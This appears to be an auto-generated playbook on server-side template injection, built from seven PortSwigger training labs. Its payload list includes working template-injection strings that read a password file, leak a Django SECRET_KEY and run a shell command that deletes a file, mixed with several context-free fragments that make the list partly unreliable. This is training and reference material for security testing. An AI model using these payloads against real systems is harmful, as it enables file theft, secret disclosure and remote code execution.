## SSTI Playbook
*Synthesized from 7 PortSwigger labs*

### Overview
This playbook covers 7 known attack techniques for ssti.

### Attack Techniques

**General:**
- Basic server-side template injection
- Basic server-side template injection (code context)
- Server-side template injection in a sandboxed environment
- Server-side template injection in an unknown language with a documented exploit
- Server-side template injection using documentation
- Server-side template injection with a custom exploit
- Server-side template injection with information disclosure via user-supplied objects

### Key Payloads
```
morale.txt
TemplateModel
Object
<%= 7*7 %>
debug
"Unfortunately this product is out of stock"
${someExpression}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/[TARGET_USER]/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
{{settings.SECRET_KEY}}
{{someExpression}}
/home/[TARGET_USER]/User.php
user.setAvatar('/home/[TARGET_USER]/User.php','image/jpg')
blog-post-author-display
system()
[LAB_ID]
message
https://[LAB_ID].[TARGET]/?message=<%25+system("rm+/home/[TARGET_USER]/morale.txt")+%25>
{% somePython %}
user
user.gdprDelete()
```

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

